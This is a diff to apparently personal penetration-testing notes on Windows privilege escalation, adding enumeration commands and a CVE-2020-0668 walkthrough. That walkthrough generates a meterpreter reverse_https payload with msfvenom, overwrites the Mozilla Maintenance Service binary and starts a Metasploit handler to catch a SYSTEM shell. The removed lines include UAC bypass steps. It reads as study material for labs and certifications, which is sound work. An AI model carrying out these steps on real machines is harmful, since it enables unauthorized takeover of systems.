+	- Auto: `shutdown /r /t 0`
 
 ### Local Processes
 
@@ -6430,15 +6844,33 @@ Allows to steal credentials from common processes or get a SYSTEM shell, by exec
 
   - Every running process
 
-  ```cmd
-  tasklist /v /fi "STATUS eq running"
-  ```
+  	```cmd
+  	tasklist /v /fi "STATUS eq running"
+  	```
 
   - Processes spawnd by a service:
 
-  ```cmd
-  tasklist /svc | findstr /v "N/A" | findstr /v "svchost"
+  	```cmd
+  	tasklist /svc | findstr /v "N/A" | findstr /v "svchost"
+  	```
+
+  - Check if it is 32 or 64bit (can be 32 even if the architecture is 64 for retro compatibility) (important for BUFFER OVERFLOW!)
+
+  	```cmd
+  	wmic process get Name, MaximumWorkingSetSize
+  	```
+
+  	If the Size is > 3096, then it is 64bit
+
+- Check for binaries with weak ACLs with 
+
+  ```powershell
+  .\SharpUp.exe audit
   ```
+  
+  - Check permissions with `icacls`
+- See if the binary is replacable my a malware
+  - If it is a service `sc stop [SERVICE]` `sc start [SERVICE]`
 
 - [Splunk     → Forwarder Abuse](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) / [Splunk Admin RevShell](https://github.com/0xjpuff/reverse_shell_splunk/)
 
@@ -6462,7 +6894,15 @@ Look for `GENERIC_WRITE` / `FILE_ALL_ACCESS` or any kind of `WRITE`
 
 ### Local Applications
 
-Relevant directories:
+#### Enumeration
+
+```cmd
+wmic product get name,version | findstr /iv "microsoft" | findstr /iv "windows"
+```
+
+- E.g. [Druva 6.6.3](https://www.exploit-db.com/exploits/49211) &rarr; meterpreter upgrade, run `background` and search for druva
+
+#### Relevant directories:
 
 - `C:`
   - `inetpub\wwwroot` web application folder
@@ -6500,10 +6940,74 @@ Exploiting: https://0xdf.gitlab.io/2020/08/08/htb-fatty.html
 ### OS
 
 
-- `systeminfo`
-- Kernel Exploits
-- In meterpreter: local exploit suggester module
-- Vulnerable Software:  `C:\Program Files` 
+- **Enumeration**
+
+
+	- `systeminfo` &rarr; look for 
+	- Installed updates: `wmic qfe list brief`
+	- In meterpreter: local exploit suggester module
+
+- **Research**
+
+
+	- [PatchCheker](https://patchchecker.com)
+
+	- ```bash
+		python3 ~\TOOLS\PRIVESC_WINDOWS\wes.py --update-wes
+		python3 ~\TOOLS\PRIVESC_WINDOWS\wes.py systeminfo.txt
+		```
+
+		`systeminfo.txt` is a txt file with the output of systeminfo
+
+#### CVEs
+
+- **[CVE-2021-36934](https://github.com/GossiTheDog/HiveNightmare) HiveNightmare, aka SeriousSam** Windows 10 
+
+	Read of the SAM, SYSTEM, and SECURITY registry
+
+- **[CVE-2021-1675/CVE-2021-34527]( [This](https://github.com/cube0x0/CVE-2021-1675)) PrintNightmare**
+
+	If you have `SeLoadDriverPrivilege`, check for Spooler service:
+
+	```powershell
+	ls \\localhost\pipe\spoolss
+	```
+
+- [CVE-2020-0668](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/) on Windows Service Tracing &rarr; Use Visual Studio or look for prebuilt
+
+  - look for any third-party software such as the  Mozilla Maintenance Service, that runs in the context of SYSTEM and is startable by unprivileged users or  [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges
+
+  - Generate a malware
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=4444 -f exe > maintenanceservice.exe
+    ```
+
+  - Generate a non broken copy
+
+  	```cmd
+  	copy .\maintenanceservice.exe .\maintenanceservice2.exe
+  	```
+
+  - Overwrite the privileges
+
+    ```cmd
+    C:\Tools\CVE-2020-0668\CVE-2020-0668.exe .\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+    ```
+
+  - Overwrite the file with the malware
+
+  	```cmd
+  	copy /Y .\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+  	```
+
+  - Start the listener
+
+    ```bash
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 4444; exploit"
+    ```
+
+  - `net start MozillaMaintenance` will throw an error, but you should get the shell
 
 ### Evasion
 
@@ -6552,26 +7056,6 @@ You have an antivirus when you cannot execute malwares [Hacktricks](https://book
     ```
 
   - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
-
-
-#### UAC
-
-When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
-
-- Enumeration
-  - Member of "Administrators" + Restricted Privileges / File Access
-  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
-  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
-- Bypasess
-  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
-  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
-  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
-  - EventViewer Method
-    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
-    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
-  - PSExec (Local / Remote)
-    - `PsExec.exe -h -s -i cmd` -> No Credentials
-    - `psexec.py [AUTH_STRING]` -> Requires Credentials
 
 # OSINT
 
@@ -6687,5 +7171,3 @@ When you are member of Administrators, but you have restricted privileges and fi
 
   -  [domain.glass](https://domain.glass) 
   -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
-  
-  
